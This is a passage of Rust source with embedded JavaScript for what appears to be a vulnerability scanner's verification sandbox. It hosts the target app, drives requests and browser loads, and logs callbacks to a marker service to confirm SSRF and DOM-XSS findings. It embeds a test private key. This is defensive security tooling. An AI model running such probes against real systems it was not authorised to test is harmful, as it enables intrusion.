  res.statusCode = result.status || 200;
  const headers = result.headers;
  try {
    if (headers && typeof headers.forEach === 'function') headers.forEach((v, k) => res.setHeader(k, v));
    else if (headers && typeof headers === 'object') for (const k in headers) res.setHeader(k, headers[k]);
  } catch (e) {}
  let body = (result.jsonBody !== undefined) ? JSON.stringify(result.jsonBody) : result.body;
  if (body == null) return res.end();
  if (Buffer.isBuffer(body)) return res.end(body);
  if (typeof body === 'string') return res.end(body);
  if (body && typeof body.pipe === 'function') { try { return body.pipe(res); } catch (e) { return res.end(); } }
  if (body instanceof Uint8Array || body instanceof ArrayBuffer) return res.end(Buffer.from(body));
  if (body && typeof body.toString === 'function') return res.end(body.toString());
  try { res.end(String(body)); } catch (e) { res.end(); }
}

http.createServer((req, res) => {
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (e) { res.statusCode = 400; return res.end(); }
  const method = (req.method || 'GET').toUpperCase();
  const chunks = [];
  let size = 0;
  req.on('data', (c) => { size += c.length; if (size <= 5 * 1024 * 1024) chunks.push(c); });
  req.on('error', () => { try { res.statusCode = 400; res.end(); } catch (e) {} });
  req.on('end', async () => {
    const raw = Buffer.concat(chunks);
    let matched = null;
    const params = {};
    for (const r of routes) {
      const c = r._c || (r._c = compile(r.route));
      const mm = c.regex.exec(u.pathname);
      if (!mm) continue;
      if (r.methods && r.methods.length) {
        const upper = r.methods.map((x) => String(x).toUpperCase());
        if (!upper.includes(method) && !upper.includes('*')) continue;
      }
      matched = r;
      c.keys.forEach((k, i) => {
        const raw = mm[i + 1] == null ? '' : mm[i + 1];
        try { params[k] = decodeURIComponent(raw); } catch (e) { params[k] = raw; }
      });
      break;
    }
    if (!matched) { res.statusCode = 404; return res.end('not found'); }
    let result;
    try {
      result = await matched.handler(makeRequest(req, u, raw, params), makeContext());
    } catch (e) {
      try { if (!res.headersSent) res.statusCode = 500; if (!res.writableEnded) res.end(); } catch (x) {}
      return;
    }
    writeResult(res, result);
  });
}).listen(port, '0.0.0.0', () => console.error('[azure-host] listening on ' + port + ' with ' + routes.length + ' route(s)'));
"#;

/// Serves a module worker. Cloudflare Workers, Deno and Bun all run an HTTP origin by importing a
/// module whose default export is an object with a `fetch(request, env, ctx)` method, which the
/// runtime invokes once per request and whose returned web `Response` it writes back. The worker binds
/// no listener itself, so this shim reconstructs that contract: it imports the module, takes
/// `default.fetch`, and serves it over HTTP on `PORT`, building the web `Request` the handler reads
/// (its `url`, `method`, `headers`, body) and writing its `Response` back.
///
/// The incoming request is presented with an `https` scheme, modelling the TLS traffic a deployed
/// worker actually receives: a worker that redirects plain `http` to `https` before doing its work
/// (`if (url.protocol === 'http:') return Response.redirect(...)`) would otherwise never reach its own
/// logic. This grants the request nothing — it fixes only the transport the exploit rides over, which
/// the real deployment already provides — and the handler's real sink still runs unchanged on the
/// attacker-controlled URL. Node 22 provides `fetch`/`Request`/`Response`/`Headers`/`URL` and a global
/// `crypto` with `randomUUID`, so a worker's own `fetch`/`crypto` calls run against the real runtime.
const WORKER_HOST_JS: &str = r#"
import http from 'node:http';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { register } from 'node:module';

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

// A TypeScript module worker (`src/index.ts` with `export default { fetch }`) imports its sibling
// modules without a file extension (`import { x } from './email'`), which Node's ESM loader rejects
// even though it strips the types. Register a resolve hook that, only when the default resolution
// fails for a relative specifier, retries with the real source extensions (and an `index.*`), so the
// worker's own `.ts`/`.tsx` graph loads the same way its deployment bundler would wire it. A no-op
// for a `.js` worker: the default resolution already succeeds and the hook is never consulted.
const RESOLVE_HOOK =
  "import{existsSync}from'node:fs';import{fileURLToPath,pathToFileURL}from'node:url';" +
  "const E=['.ts','.tsx','.mts','.cts','.js','.mjs','.cjs','.jsx','.json'];" +
  "export async function resolve(s,c,n){" +
  "if(s[0]==='.'||s[0]==='/'||s.startsWith('file:')){" +
  "try{return await n(s,c);}catch(err){" +
  "let b;try{b=s.startsWith('file:')?fileURLToPath(s):fileURLToPath(new URL(s,c.parentURL));}catch(e){throw err;}" +
  "for(const x of E)if(existsSync(b+x))return n(pathToFileURL(b+x).href,c);" +
  "for(const x of E)if(existsSync(b+'/index'+x))return n(pathToFileURL(b+'/index'+x).href,c);" +
  "throw err;}}return n(s,c);}";
try {
  register('data:text/javascript,' + encodeURIComponent(RESOLVE_HOOK));
} catch (e) {
  console.error('[worker-host] resolve hook registration failed: ' + (e && (e.message || e)));
}

const port = Number(process.env.PORT || 3000);
const target = path.resolve(process.cwd(), process.argv[2] || '');

let handler = null;
let env = {};
// 'fetch' for a Web/edge or Cloudflare `fetch(request, env, ctx)` handler (returns a `Response`);
// 'node' for a Vercel Node serverless function `(req, res)` that reads `req.query`/`req.body` and
// writes an Express-like `res`. A bare default-export function of arity >= 2 is the Node convention;
// an arity-1 function (or a worker's `default.fetch`) is the Web convention.
let handlerKind = 'fetch';
try {
  const mod = await import(pathToFileURL(target).href);
  const def = mod && (mod.default || mod);
  if (def && typeof def.fetch === 'function') {
    handler = def.fetch.bind(def);
    handlerKind = 'fetch';
  } else if (typeof def === 'function') {
    handler = def;
    handlerKind = def.length >= 2 ? 'node' : 'fetch';
  }
} catch (e) {
  console.error('[worker-host] load error: ' + (e && (e.stack || e.message) || e));
}

// An Express-like response surface over a Node `ServerResponse`, so a Vercel Node function's
// `res.status(code).json(obj)`, `res.send(buf)`, `res.setHeader(...)` calls work unchanged.
function decorateRes(res) {
  res.status = (c) => { res.statusCode = c; return res; };
  res.set = res.header = (k, v) => {
    if (k && typeof k === 'object') { for (const n in k) { try { res.setHeader(n, k[n]); } catch (e) {} } }
    else { try { res.setHeader(k, v); } catch (e) {} }
    return res;
  };
  res.type = (t) => { try { res.setHeader('Content-Type', t); } catch (e) {} return res; };
  res.json = (obj) => { try { if (!res.headersSent) res.setHeader('Content-Type', 'application/json'); } catch (e) {} res.end(JSON.stringify(obj)); return res; };
  res.send = (b) => {
    if (b !== null && typeof b === 'object' && !Buffer.isBuffer(b)) return res.json(b);
    res.end(b == null ? '' : (Buffer.isBuffer(b) ? b : String(b)));
    return res;
  };
  res.sendStatus = (c) => { res.statusCode = c; res.end(String(c)); return res; };
  res.redirect = (loc) => { res.statusCode = 302; try { res.setHeader('Location', loc); } catch (e) {} res.end(); return res; };
  return res;
}

// The parsed request body a Vercel Node function reads as `req.body` (JSON or form-urlencoded, like
// the deployment's built-in body parser); the raw text otherwise.
function parseNodeBody(req, raw) {
  if (!raw) return {};
  const ct = String(req.headers['content-type'] || '').toLowerCase();
  try {
    if (ct.indexOf('application/x-www-form-urlencoded') >= 0) return Object.fromEntries(new URLSearchParams(raw));
    return JSON.parse(raw);
  } catch (e) { return raw; }
}

// Serve a Vercel Node serverless function: decorate the real request/response with the fields such a
// handler reads (`req.query`, `req.body`, `req.path`) and writes (`res.status().json()`), call it, and
// let it end the response itself. A handler that instead returns a Web `Response` (an edge function of
// arity 2) is still handled: its return value is written when it never touched `res`.
async function serveNode(req, res, raw) {
  decorateRes(res);
  req.get = (h) => req.headers[String(h).toLowerCase()];
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (e) { res.statusCode = 400; return res.end(); }
  req.query = Object.fromEntries(u.searchParams);
  req.path = u.pathname;
  req.rawBody = raw.toString('utf8');
  req.body = parseNodeBody(req, req.rawBody);
  let result;
  try {
    result = await handler(req, res);
  } catch (e) {
    try { if (!res.headersSent) res.statusCode = 500; if (!res.writableEnded) res.end(); } catch (x) {}
    return;
  }
  if (!res.writableEnded) {
    if (result && typeof result.arrayBuffer === 'function') {
      await writeResponse(res, result);
    } else {
      res.end();
    }
  }
}

function makeContext() {
  return {
    waitUntil: (p) => { try { Promise.resolve(p).catch(() => {}); } catch (e) {} },
    passThroughOnException: () => {},
    props: {},
  };
}

function readBody(req) {
  return new Promise((resolve) => {
    const chunks = [];
    let size = 0;
    req.on('data', (c) => { size += c.length; if (size <= 5 * 1024 * 1024) chunks.push(c); });
    req.on('error', () => resolve(Buffer.alloc(0)));
    req.on('end', () => resolve(Buffer.concat(chunks)));
  });
}

async function writeResponse(res, response) {
  if (res.writableEnded) return;
  if (!response) { res.statusCode = 204; return res.end(); }
  try {
    res.statusCode = response.status || 200;
    if (response.headers && typeof response.headers.forEach === 'function') {
      response.headers.forEach((v, k) => { try { res.setHeader(k, v); } catch (e) {} });
    }
    const buf = Buffer.from(await response.arrayBuffer());
    res.end(buf);
  } catch (e) {
    try { if (!res.headersSent) res.statusCode = 502; if (!res.writableEnded) res.end(); } catch (x) {}
  }
}

http.createServer(async (req, res) => {
  const raw = await readBody(req);
  if (!handler) { res.statusCode = 502; return res.end('no worker handler'); }
  if (handlerKind === 'node') { return serveNode(req, res, raw); }
  // The authority is synthetic (the worker reads only the path/query it carries); the scheme is
  // `https` so the request models deployed TLS traffic rather than a redirectable plain-http hit.
  const host = req.headers.host || 'localhost';
  const url = 'https://' + host + req.url;
  let request;
  try {
    const init = { method: req.method || 'GET', headers: req.headers, duplex: 'half' };
    if (!['GET', 'HEAD'].includes((req.method || 'GET').toUpperCase()) && raw.length) {
      init.body = raw;
    }
    request = new Request(url, init);
  } catch (e) {
    res.statusCode = 400; return res.end('bad request');
  }
  let response;
  try {
    response = await handler(request, env, makeContext());
  } catch (e) {
    try { if (!res.headersSent) res.statusCode = 500; if (!res.writableEnded) res.end(); } catch (x) {}
    return;
  }
  await writeResponse(res, response);
}).listen(port, '0.0.0.0', () => console.error('[worker-host] listening on ' + port + (handler ? ' with ' + handlerKind + ' handler' : ' with NO handler')));
"#;

/// Sends one request to the app on localhost and prints the response body. Reads its spec from
/// argv[2]. Kept tiny and dependency-free (core `http`).
const DRIVER_JS: &str = r#"
const http = require('http');
const https = require('https');
const spec = JSON.parse(process.argv[2]);
// An app that binds `localhost` listens on a single loopback address, which may be IPv6 (`::1`)
// rather than IPv4. Try each loopback family in turn so the request reaches the server however it
// bound; a connection error (nothing listening on that family) falls through to the next.
// The app may serve plain HTTP or TLS. `spec.tls` orders the attempt (the sandbox sets it when it
// provisioned a key/cert so the app could bind an `https`/`tls` server), but either protocol is
// tried as a fallback so the request lands whichever the app speaks. For HTTPS the client does not
// verify the app's self-signed certificate — this is the verifier's own test client reaching the
// app under test, not a relaxation of any security control the app enforces.
const hosts = ['127.0.0.1','::1'];
const mods = spec.tls ? [['https',https],['http',http]] : [['http',http],['https',https]];
const combos = [];
for(const m of mods){for(const h of hosts){combos.push([m[0],m[1],h]);}}
let ci = 0;
const errors = [];
function attempt(){
  if(ci>=combos.length){if(errors.length){console.error(errors.join('; '));} process.exit(0);}
  const [name,mod,host] = combos[ci++];
  const options = {host,port:spec.port,method:spec.method,path:spec.path,headers:spec.headers,timeout:10000};
  if(name==='https'){options.rejectUnauthorized=false;}
  let sent = false;
  const done = (data)=>{if(sent){return;} sent=true; try{process.stdout.write(data,()=>process.exit(0));}catch(e){process.exit(0);}};
  const req = mod.request(options,(res)=>{
    let data='';
    // Cap how much is kept (a large body is only compared, never parsed), but still emit what was
    // collected: dropping it entirely would make a large success response read as empty and hide,
    // from the read oracle, the difference between a file-found render and a not-found error.
    res.on('data',(c)=>{if(data.length<=65536){data+=c;} if(data.length>65536){done(data);}});
    res.on('end',()=>{done(data);});
  });
  // An upgrade request completes with an 'upgrade' event instead of a response; the out-of-band
  // marker signal is what confirms it, so just end the request once it is answered either way.
  req.on('upgrade',(res,socket)=>{try{socket.destroy();}catch(e){}process.exit(0);});
  // A connection or protocol-mismatch error (the wrong scheme for this port) falls through to the
  // next combo so the right protocol is still tried.
  req.on('error',(e)=>{errors.push(name+'://'+host+': '+e.message);attempt();});
  req.on('timeout',()=>{errors.push(name+'://'+host+': timeout');req.destroy();attempt();});
  const body = spec.bodyBase64 ? Buffer.from(spec.bodyBase64, 'base64') : spec.body;
  if(body){req.write(body);}
  req.end();
}
attempt();
"#;

/// Records the path of every request it receives, on stdout, so a marker hit shows in the
/// container logs. Listens on HTTP port 80 and, when the planted certificate is present, HTTPS
/// port 443 — so an outbound request whose host (not whole URL) is attacker-controlled still
/// lands here even when the app uses `https`/`http.request` against a fixed port. The certificate
/// is trusted by the app through `NODE_EXTRA_CA_CERTS`, so TLS verification passes honestly
/// instead of being disabled.
const MARKER_JS: &str = r#"
const http = require('http');
const port = Number(process.env.JSS_MARKER_PORT || 80);
const record = (req) => console.log('MARKER ' + JSON.stringify({
  method: req.method,
  path: req.url,
  userAgent: req.headers['user-agent'] || null,
}));
const log = (req, res) => { record(req); res.end('ok'); };
// An outbound request whose host is attacker-controlled may be forwarded with upgrade headers
// (a proxied WebSocket/upgrade request). Record those too, so a reached-service signal is seen
// however the request arrives, then drop the raw socket.
const logUpgrade = (req, socket) => { record(req); try { socket.destroy(); } catch (e) {} };
const httpServer = http.createServer(log);
httpServer.on('upgrade', logUpgrade);
httpServer.listen(port, '0.0.0.0');
try {
  const fs = require('fs');
  const https = require('https');
  const key = fs.readFileSync('/jss-marker.key');
  const cert = fs.readFileSync('/jss-marker.crt');
  const httpsServer = https.createServer({ key, cert }, log);
  httpsServer.on('upgrade', logUpgrade);
  httpsServer.listen(443, '0.0.0.0');
} catch (e) {
  console.error('marker: TLS listener disabled (' + e.message + ')');
}
"#;

/// A self-signed certificate (and its key) for the isolated marker, baked in as a verification
/// fixture — not a secret. The marker serves TLS with it and the app image trusts it as a CA
/// (`NODE_EXTRA_CA_CERTS`), so the app's own `https` verification accepts the marker without being
/// weakened. Its SANs cover `jss-marker` and `*.callback.satori.ci`: the latter is needed when the
/// one freshly registered callback hostname is DNS-aliased to this same private marker. No other
/// callback hostname is added to the private network. Validity runs to 2126.
const MARKER_CERT: &str = r#"-----BEGIN CERTIFICATE-----
MIIDOzCCAiOgAwIBAgIUa51ZLquEX+PI1DBtCRKHfVgK1rQwDQYJKoZIhvcNAQEL
BQAwFTETMBEGA1UEAwwKanNzLW1hcmtlcjAgFw0yNjExMTMwMTI4MTNaGA8yMTI2
MTAyMDAxMjgxM1owFTETMBEGA1UEAwwKanNzLW1hcmtlcjCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBALUV9q5RPMfH1khPiE/V7XP6UKjsyqH9h+vNhXfc
AtYnEbW3s7oSo7MqWcXIYl7vbFKLslSyzSGqCDGZCZ+efBKT1EiTfQ8IH+fKKBfk
CVvm+tKEGudn2+mb8y1dnNNDndZ4L2qiJtlPSt6dZirdAYlcwdq5q4t6SCvG/13j
W5TORswXlc6MwjfF3G9mQXGTL+ThQavpwRRD5yNmxemwv+LsPR3l6htY9opWIJDU
K5Mv9mavL51WUEGvXWxIR4EyqhMRaXbOPtOd8v1HGGz0u6J7TFACaXWGA13JoPV5
2GXthFuZYKovWyDnnKehUpZuB3YI97DQTmK28VnOm9RIJhsCAwEAAaOBgDB+MB0G
A1UdDgQWBBQHhBPGeYjxDVH1SxHOshs4lH/LqzAfBgNVHSMEGDAWgBQHhBPGeYjx
DVH1SxHOshs4lH/LqzAPBgNVHRMBAf8EBTADAQH/MCsGA1UdEQQkMCKCCmpzcy1t
YXJrZXKCFCouY2FsbGJhY2suc2F0b3JpLmNpMA0GCSqGSIb3DQEBCwUAA4IBAQCd
PM48JoQ6oTg746POJkSSzkU8OBhrZpQmeD+z7VT8oGOdV1a8P8ayEmLn2mQzBT19
xfboK9j4tmlLiUphQCDvcCEhq/4+/sO4KswP5ZT3dZYSXz8SHVT4yxq+GlFSk6OK
2H5A6OoYGW5emtyCfkcJzrRFv03LyBCrkkXN3JO3UshG506vcMUHkK8nwhomhiyH
A/wk0TYU+Ba5/fDYBrvzY3HoKk+THxtZgSMu8A/bKdrpTR84SpabgtexO5ZkMGCG
H4FCnrwjVRLMECc627x2yCyIyjyuSqWC95Z7vZ8UdGAGHUzZChSvbiYQgnIiP/6U
QcvK4tx3luOLSkF2/rLY
-----END CERTIFICATE-----
"#;

/// The private key for [`MARKER_CERT`]. A throwaway key for an isolated, internal-only test
/// service; it secures nothing and is intentionally public.
const MARKER_KEY: &str = r#"-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC1FfauUTzHx9ZI
T4hP1e1z+lCo7Mqh/YfrzYV33ALWJxG1t7O6EqOzKlnFyGJe72xSi7JUss0hqggx
mQmfnnwSk9RIk30PCB/nyigX5Alb5vrShBrnZ9vpm/MtXZzTQ53WeC9qoibZT0re
nWYq3QGJXMHauauLekgrxv9d41uUzkbMF5XOjMI3xdxvZkFxky/k4UGr6cEUQ+cj
ZsXpsL/i7D0d5eobWPaKViCQ1CuTL/Zmry+dVlBBr11sSEeBMqoTEWl2zj7TnfL9
Rxhs9Luie0xQAml1hgNdyaD1edhl7YRbmWCqL1sg55ynoVKWbgd2CPew0E5itvFZ
zpvUSCYbAgMBAAECggEABqi6G4rtO0OEA8C4+IabZsprsOqUQQS7vNYf9Fpo2Esz
gYUx3MPWtT33cyh9RZR0XUy50BeLJ5PDHV/NVMtVMLGy+sBBtw3LbpCmjMpb9b82
tgsZmizdj2emt6JbpAE2iq58v+UanJ8n16veF/FsnwqELnDpeAWVJdb5iRBVS9GC
OvQScyVSN9egf2qAeyTKJ0XSLC0kphF4N4xA1WPf7Fd/kijLuCEN4RWQNS6zGQGU
XqYqoV+7uwIdHetMkMoCNQAC8ecVmuzbeRMd8+QdJPpQQ0+N299B56LB9QAyTBF4
Dy0AvTTcaMTpkPKpg0abX7yttQF3p3Rqh2iYdRyl8QKBgQDhSj5EQSe3g/ghbO2w
xgK2lAvGilfz3wVGXFRGu0C9kniCXDXXvQE3Xfi37NnO5+TenCQ3bcOTl08jvL6O
A6UETWU1HNBP4A0KuGWJ72to6hroNARgXqc96NOKx5G/sIKLeVIfPMt0TPUdz0dN
BTnzI49L6CjZZb2UNq8rPVqc1QKBgQDNxSmv9l5Pn9mXa4bPYUj0GqmQKe191g4o
2Ur3rWgCSpChuV0Edg4GwOzi7nNte9hv7tCEPOs15QcyPxvWX7/kVlOela/OBVzQ
sc3m+WL4836jq9bSIE/RQlQILvPbEhHxYTWhpOG2N3HtwgU0vL4aBZA/5Mj0JYtR
Qju1qpFvLwKBgEtq4itRMG2DtSXjZDKAJtpd9w8wsr7F0us571B6UPLlPIhPPAsL
j4OsZp2ToVpdUMWguZMAoK8gwPJytcuutqgZDJ9aFPYYR+Vl0z/4sRk+/WDsQObN
6OiVr3NO2aC1Aw6Tv4ULggRd2tRu1iyXak3VgpvjjQExyOP75mnwMQw9AoGAFfc6
IAKYxr81pyhfV7v24bgG6dDP/WLgWBP6IL5uH/B9yAXVnChODwKBRyhVQha6YBiK
QdOO+E3emsqJ2jSWc3WTr5YjEkcYRV71r/ZnTlQP7MDnSb8RRjFibw00Euq256GM
7BiBz8XTb6IKlDqhwH1fjLKLkSSA3sfHP/lZVRkCgYEAtMc/YAsfE1hvlUiJPNQH
Atim9OfvZSDm0lp0LDaKOFNdL9hr2bSb62L0otu2CIq/AXuYOfvsCSIGSZ2msipc
tPgc1T0LwdsHTm0yF5buV2M9qoqKP3AsupUwHj33tg6eRM9kVAEnchtL8CDslxnH
SqwRqIrWiDKu9S43xShSlHI=
-----END PRIVATE KEY-----
"#;

// ----- browser phase (DOM-source XSS and client-side redirects) ---------------------------------

/// The browser-phase base image: Playwright's, which carries Node, Chromium and its system
/// dependencies. Pinned.
const BROWSER_IMAGE: &str = "mcr.microsoft.com/playwright:v1.49.1-jammy";

fn local_browser_executable() -> Option<std::path::PathBuf> {
    let candidates = vec![
        std::path::PathBuf::from("chromium"),
        std::path::PathBuf::from("chromium-browser"),
        std::path::PathBuf::from("google-chrome"),
    ];
    #[cfg(target_os = "macos")]
    let candidates = {
        let mut candidates = candidates;
        candidates.push(std::path::PathBuf::from(
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        ));
        candidates
    };
    candidates.into_iter().find(|candidate| {
        Command::new(candidate)
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .is_ok_and(|status| status.success())
    })
}

fn spawn_process_group(command: &mut Command, name: &str) -> Result<Child, String> {
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        command.process_group(0);
    }
    command
        .spawn()
        .map_err(|error| format!("starting {name}: {error}"))
}

/// A built browser-phase image, a private network, a marker service, a static file server for the
/// repo, and a browser container — one per `--verify` run that has DOM findings.
enum BrowserRuntime {
    Docker,
    Local {
        app: Child,
        marker: Child,
        marker_log: std::path::PathBuf,
        helper_dir: std::path::PathBuf,
        executable: std::path::PathBuf,
    },
}

pub struct BrowserSession {
    tag: String,
    network: String,
    app: String,
    marker: String,
    browser: String,
    canary: Canary,
    port: u16,
    nonce: u32,
    root: std::path::PathBuf,
    runtime: BrowserRuntime,
    torn_down: bool,
}

impl BrowserSession {
    /// Builds the browser-phase image from `root` and starts the marker service, the static file
    /// server and the browser, or returns why it could not.
    pub fn start(root: &std::path::Path) -> Result<Self, String> {
        if local_runtime_requested() {
            return Self::start_local(root);
        }
        let id = run_id();
        let canary = Canary::new(format!("{id}{}", short_rand()));
        let session = Self {
            tag: format!("jsspector-verify-browser:{id}"),
            network: format!("jss-verifyb-net-{id}"),
            app: format!("jss-verifyb-app-{id}"),
            marker: format!("jss-verifyb-marker-{id}"),
            browser: format!("jss-verifyb-br-{id}"),
            canary,
            port: 3000,
            nonce: 0,
            root: root.to_path_buf(),
            runtime: BrowserRuntime::Docker,
            torn_down: false,
        };
        build_browser_image(root, &session.tag, session.port)?;
        docker(&["network", "create", "--internal", &session.network])
            .map_err(|e| format!("could not create the private network: {e}"))?;
        if let Err(err) = session.boot() {
            let mut session = session;
            session.teardown();
            return Err(err);
        }
        Ok(session)
    }

    fn start_local(root: &std::path::Path) -> Result<Self, String> {
        let executable = local_browser_executable().ok_or_else(|| {
            "no Chromium/Chrome executable is available for local browser verification".to_owned()
        })?;
        let id = run_id();
        let app_port = available_local_port()?;
        let marker_port = available_local_port()?;
        let helper_dir = std::env::temp_dir().join(format!("jss-browser-{id}"));
        std::fs::create_dir_all(&helper_dir)
            .map_err(|error| format!("creating local browser helper directory: {error}"))?;
        let serve = helper_dir.join("serve.js");
        let marker_script = helper_dir.join("marker.js");
        let marker_log = helper_dir.join("marker.log");
        std::fs::write(&serve, SERVE_JS)
            .map_err(|error| format!("writing local browser server: {error}"))?;
        std::fs::write(&marker_script, MARKER_JS)
            .map_err(|error| format!("writing local browser marker: {error}"))?;
        let marker_stdout = std::fs::File::create(&marker_log)
            .map_err(|error| format!("creating local browser marker log: {error}"))?;
        let marker_stderr = marker_stdout
            .try_clone()
            .map_err(|error| format!("opening local browser marker log: {error}"))?;

        let mut marker_command = Command::new("node");
        marker_command
            .arg(&marker_script)
            .env("JSS_MARKER_PORT", marker_port.to_string())
            .stdout(marker_stdout)
            .stderr(marker_stderr);
        let mut marker = spawn_process_group(&mut marker_command, "local browser marker")?;

        let mut app_command = Command::new("node");
        app_command
            .arg(&serve)
            .arg(root)
            .arg(app_port.to_string())
            .stdout(Stdio::null())
            .stderr(Stdio::null());
        let mut app = match spawn_process_group(&mut app_command, "local browser server") {
            Ok(app) => app,
            Err(error) => {
                stop_local_process(&mut marker);
                let _ = std::fs::remove_dir_all(&helper_dir);
                return Err(error);
            }
        };
        if let Err(error) = wait_local_service(&mut marker, marker_port, "browser marker")
            .and_then(|_| wait_local_service(&mut app, app_port, "browser server"))
        {
            stop_local_process(&mut app);
            stop_local_process(&mut marker);
            let _ = std::fs::remove_dir_all(&helper_dir);
            return Err(error);
        }

        Ok(Self {
            tag: String::new(),
            network: String::new(),
            app: String::new(),
            marker: String::new(),
            browser: String::new(),
            canary: Canary::new(format!("{id}{}", short_rand()))
                .with_marker_host(Some(format!("0x7f000001:{marker_port}"))),
            port: app_port,
            nonce: 0,
            root: root.to_path_buf(),
            runtime: BrowserRuntime::Local {
                app,
                marker,
                marker_log,
                helper_dir,
                executable,
            },
            torn_down: false,
        })
    }

    fn boot(&self) -> Result<(), String> {
        docker(&[
            "run",
            "-d",
            "--name",
            &self.marker,
            "--network",
            &self.network,
            "--network-alias",
            "jss-marker",
            "--entrypoint",
            "node",
            &self.tag,
            "/jss-marker.js",
        ])
        .map_err(|e| format!("could not start the marker service: {e}"))?;
        // The static file server for the repo, reachable as `jss-app`.
        docker(&[
            "run",
            "-d",
            "--name",
            &self.app,
            "--network",
            &self.network,
            "--network-alias",
            "jss-app",
            "--entrypoint",
            "node",
            &self.tag,
            "/jss-serve.js",
            "/app",
            &self.port.to_string(),
        ])
        .map_err(|e| format!("could not start the static server: {e}"))?;
        // The browser container, kept alive so each page load is a quick `docker exec`.
        docker(&[
            "run",
            "-d",
            "--name",
            &self.browser,
            "--network",
            &self.network,
            "--security-opt",
            "no-new-privileges",
            "--shm-size",
            "512m",
            "--memory",
            "2g",
            "--entrypoint",
            "sleep",
            &self.tag,
            "infinity",
        ])
        .map_err(|e| format!("could not start the browser container: {e}"))?;
        self.wait_until_serving()
    }

    fn wait_until_serving(&self) -> Result<(), String> {
        for _ in 0..30 {
            let probe = exec_in(
                &self.app,
                &[
                    "node",
                    "-e",
                    &format!(
                        "require('net').connect({{port:{},host:'127.0.0.1'}}).on('connect',()=>process.exit(0)).on('error',()=>process.exit(1))",
                        self.port
                    ),
                ],
            );
            if probe.map(|o| o.status.success()).unwrap_or(false) {
                return Ok(());
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        Err("the static server did not start within 30s".to_owned())
    }

    /// Loads the app in the browser with the probe's canary and reports whether it executed.
    ///
    /// Two passes. First a direct load of each attempt URL on the primary host page — the plain,
    /// fast path that drives a DOM sink reached on page load. Then, for an HTML/navigation sink
    /// whose payload rides the URL (not the referrer), a harness pass across every host page that
    /// loads the script: each load goes through `/__jss/harness`, which seeds the app's own
    /// `localStorage` feature flags and re-dispatches a client-side navigation at the framed page,
    /// so a sink reached only after the single-page app routes (a `popstate`/navigation handler, or
    /// a widget that only the right page and feature flag build) still runs. The harness only drives
    /// the app's own code; the canary is written into the DOM by the application, never by us.
    pub fn exercise(&mut self, probe: &super::plan::BrowserProbe) -> Outcome {
        self.nonce += 1;
        let page = match self.find_page(&probe.file) {
            Ok(page) => page,
            Err(reason) => return Outcome::Skipped { reason },
        };
        let attempts = super::browser::browser_attempts(probe, &page, &self.canary, self.nonce);
        let referrer = super::browser::via_referrer(probe)
            .then(|| super::browser::referrer_payload(probe, &self.canary, self.nonce));
        let mut tried = 0usize;
        for attempt in &attempts {
            let hit = referrer
                .as_ref()
                .map_or(attempt.token.as_str(), |(_, t)| t.as_str());
            tried += 1;
            if self.drive(&attempt.url, hit, referrer.as_ref()) {
                return browser_verified(&attempt.url, hit);
            }
        }
        // Harness pass: only a URL-delivered HTML/navigation probe can be driven this way (a
        // referrer probe needs the header set per load, which the harness frame does not carry).
        if referrer.is_none() {
            let seeds = self.local_storage_seeds();
            let seeds_json = seeds_json(&seeds);
            let pages = self.find_pages(&probe.file);
            for host in pages.iter().take(MAX_HARNESS_PAGES) {
                let host_attempts =
                    super::browser::browser_attempts(probe, host, &self.canary, self.nonce);
                for attempt in host_attempts.iter().take(MAX_HARNESS_ATTEMPTS_PER_PAGE) {
                    let url = harness_url(&attempt.url, &seeds_json);
                    tried += 1;
                    if self.drive(&url, &attempt.token, None) {
                        // The reproduction is the real page URL the victim opens, not our driver.
                        return browser_verified(&attempt.url, &attempt.token);
                    }
                }
            }
        }
        Outcome::NotReproduced { tried }
    }

    /// Loads one URL (relative to the served app) in the browser and reports whether the canary
    /// reached the marker service with `hit`. `referrer`, when set, carries the payload as the
    /// Referer header for a referrer-sourced probe.
    fn drive(&self, attempt_url: &str, hit: &str, referrer: Option<&(String, String)>) -> bool {
        match &self.runtime {
            BrowserRuntime::Docker => {
                let url = format!("http://jss-app:{}{}", self.port, attempt_url);
                let mut cmd = vec!["node".to_owned(), "/jss-browser.js".to_owned(), url];
                if let Some((payload, _)) = referrer {
                    cmd.push(payload.clone());
                }
                let args: Vec<&str> = cmd.iter().map(String::as_str).collect();
                let _ = exec_in(&self.browser, &args);
                marker_hit(&tail_logs(&self.marker), hit).is_some()
            }
            BrowserRuntime::Local {
                executable,
                marker_log,
                helper_dir,
                ..
            } => {
                let url = format!("http://127.0.0.1:{}{}", self.port, attempt_url);
                let referer = referrer.map(|(payload, _)| payload.as_str());
                let browser_result = run_local_browser(executable, &url, referer, helper_dir);
                let logs = std::fs::read_to_string(marker_log).unwrap_or_default();
                let reached = marker_hit(&logs, hit).is_some();
                if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
                    eprintln!(
                        "[verify] browser load {} -> result={:?} marker={} logs[{}]",
                        attempt_url,
                        browser_result.as_ref().err(),
                        reached,
                        tail(&logs, 8)
                    );
                }
                reached
            }
        }
    }

    /// The `localStorage` feature flags the app sets itself, mined from its own scripts as
    /// `localStorage.getItem('key') === 'value'` comparisons. Seeded before a harness load so a
    /// code path the app gates behind a stored preference (a theme, a layout mode) is taken, which
    /// can be what builds the element a DOM sink writes into. First-seen per key; nothing here is
    /// tied to a particular app.
    fn local_storage_seeds(&self) -> Vec<(String, String)> {
        local_storage_flags(&self.root)
    }

    /// The served path of an HTML document that loads the vulnerable script with a plain
    /// `<script src>` (so a static load reaches its code), or the script's own page when it is
    /// itself HTML. An `Err` gives why the browser phase cannot render it directly — commonly an
    /// ES module behind an SPA entry, which v1 does not drive.
    fn find_page(&self, script: &str) -> Result<String, String> {
        let script_path = std::path::Path::new(script);
        if matches!(
            script_path.extension().and_then(|e| e.to_str()),
            Some("html" | "htm")
        ) {
            return Ok(format!("/{}", script.trim_start_matches('/')));
        }
        let base = script_path
            .file_name()
            .and_then(|n| n.to_str())
